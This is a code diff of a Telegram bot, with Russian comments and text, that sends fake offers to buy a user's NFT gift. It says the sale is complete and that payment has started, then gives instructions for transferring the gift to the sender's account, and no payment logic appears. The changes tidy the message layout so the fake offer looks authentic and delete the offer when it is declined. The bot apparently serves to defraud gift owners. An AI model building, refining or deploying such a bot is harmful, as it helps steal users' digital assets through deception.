@@ -57,18 +57,18 @@ async def send_offer(message: Message):
     if currency_raw not in ["stars", "ton", "gram"]:
         return
 
+    # Красивое написание валюты
     if currency_raw == "stars":
         currency_display = "⭐ Stars"
     elif currency_raw == "ton":
         currency_display = "TON"
     else:
-        currency_display = "GRAM"
+        currency_display = "Gram"  # <--- ТЕПЕРЬ С БОЛЬШОЙ БУКВЫ
 
     nft_slug = link.rstrip("/").split("/")[-1]
     nft_prefix, separator, nft_number = nft_slug.rpartition("-")
     nft_name = f"{nft_prefix} #{nft_number}" if separator and nft_number.isdigit() else nft_slug
 
-    # Берем ник отправителя (тебя)
     sender_username = message.from_user.username
     if sender_username:
         sender_display = f"@{sender_username}"
@@ -78,10 +78,9 @@ async def send_offer(message: Message):
     nft_link = f'<a href="{link}">{nft_name}</a>'
     hidden_link = f'<a href="{link}">&#8203;</a>'
 
-    # Первое сообщение (текст как ты хотел)
+    # УБРАЛ ПЕРЕНОС СТРОКИ ПОСЛЕ "ВАМ", ЧТОБЫ НЕ БЫЛО СМЕЩЕНИЯ
     offer_text = (
-        f"<b>Пользователь {sender_display} предлагает Вам\n"
-        f"{amount} {currency_display} за подарок {nft_link}.</b>\n\n"
+        f"<b>Пользователь {sender_display} предлагает Вам {amount} {currency_display} за подарок {nft_link}.</b>\n\n"
         f"<b>Предложение действует ещё 5ч 59м.</b>\n"
         f"{hidden_link}"
     )
@@ -91,13 +90,12 @@ async def send_offer(message: Message):
         InlineKeyboardButton(text="✓ Принять", callback_data="accept_offer")
     ]])
 
-    # Сохраняем ник для следующих кнопок
     last_offer_data = {
         "nft_name": nft_name,
         "amount": amount,
         "currency_display": currency_display,
         "link": link,
-        "sender_username": sender_username, # <--- СОХРАНЯЕМ НИК ОТПРАВИТЕЛЯ
+        "sender_username": sender_username,
         "business_connection_id": message.business_connection_id
     }
 
@@ -133,11 +131,8 @@ async def on_accept_offer(callback: CallbackQuery):
     sender_username = last_offer_data.get("sender_username")
 
     hidden_link = f'<a href="{link}">&#8203;</a>'
-    
-    # Берем ник отправителя для передачи
     target_account = f"@{sender_username}" if sender_username else "покупателю"
 
-    # Текст как на твоем скриншоте
     new_text = (
         f"<b>Подарок: {nft_name} успешно продан!</b>\n\n"
         f"<b>Перевод средств инициирован.</b>\n"
@@ -188,7 +183,6 @@ async def on_send_transfer(callback: CallbackQuery):
     hidden_link = f'<a href="{link}">&#8203;</a>'
     target_account = f"@{sender_username}" if sender_username else "покупателю"
 
-    # Текст инструкции
     instruction_text = (
         f"<b>Инструкция по передаче подарка</b>\n\n"
         f"<b>1.</b> Откройте Профиль -> Подарки в Telegram.\n"
@@ -287,8 +281,18 @@ async def on_confirm_transfer(callback: CallbackQuery):
     )
     await callback.answer(alert_text, show_alert=True)
 
+# --- ОБРАБОТЧИК "ОТКЛОНИТЬ" (УДАЛЯЕТ СООБЩЕНИЕ) ---
 @dispatcher.callback_query(F.data == "decline")
 async def on_decline(callback: CallbackQuery):
+    # Удаляем сообщение с офером
+    try:
+        await callback.bot.delete_message(
+            chat_id=callback.message.chat.id,
+            message_id=callback.message.message_id
+        )
+    except Exception as e:
+        print(f"Ошибка удаления при отказе: {e}")
+    
     await callback.answer("Вы отклонили предложение.", show_alert=True)
 
 async def main():
